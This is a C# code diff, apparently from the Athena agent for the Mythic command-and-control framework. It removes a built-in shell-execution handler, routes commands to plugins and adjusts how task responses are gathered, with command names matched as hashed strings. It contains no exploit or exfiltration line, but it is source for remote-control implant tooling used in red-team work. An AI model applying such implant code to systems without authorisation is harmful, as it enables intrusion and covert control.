@@ -33,7 +33,6 @@ namespace Athena.Commands
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
-        private ShellHandler shellHandler { get; }
         private UploadHandler uploadHandler { get; }
 #if WINBUILD
         private TokenHandler tokenHandler { get; }
@@ -44,7 +43,6 @@ namespace Athena.Commands
             this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
             this.downloadHandler = new DownloadHandler();
-            this.shellHandler = new ShellHandler();
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
 
@@ -135,10 +133,6 @@ namespace Athena.Commands
                     this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "2591C98B70119FE624898B1E424B5E91": //shell
-                    this.responseResults.Add(await this.shellHandler.ShellExec(job));
-                    this.activeJobs.Remove(task.id, out _);
-                    break;
                 case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
                     this.activeJobs.Remove(task.id, out _);
@@ -196,8 +190,13 @@ namespace Athena.Commands
                     }
                     break;
                 default:
-                    this.responseResults.Add(await CheckAndRunPlugin(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
+                    
+                    if(rr is not null)
+                    {
+                        this.responseResults.Add(rr);
+                        this.activeJobs.Remove(task.id, out _);
+                    }
                     break;
             }
 #if WINBUILD
@@ -275,17 +274,14 @@ namespace Athena.Commands
         public async Task<List<object>> GetResponses()
         {
             List<object> responses = this.responseResults.ToList<object>();
+            this.responseResults.Clear();
+
             if (this.assemblyHandler.assemblyIsRunning)
             {
                 responses.Add(await this.assemblyHandler.GetAssemblyOutput());
             }
 
-            if (await this.shellHandler.HasRunningJobs())
-            {
-                responses.AddRange(await this.shellHandler.GetOutput());
-            }
-
-            this.responseResults.Clear();
+            responses.AddRange(await PluginHandler.GetResponses());
             return responses;
         }
         /// <summary>
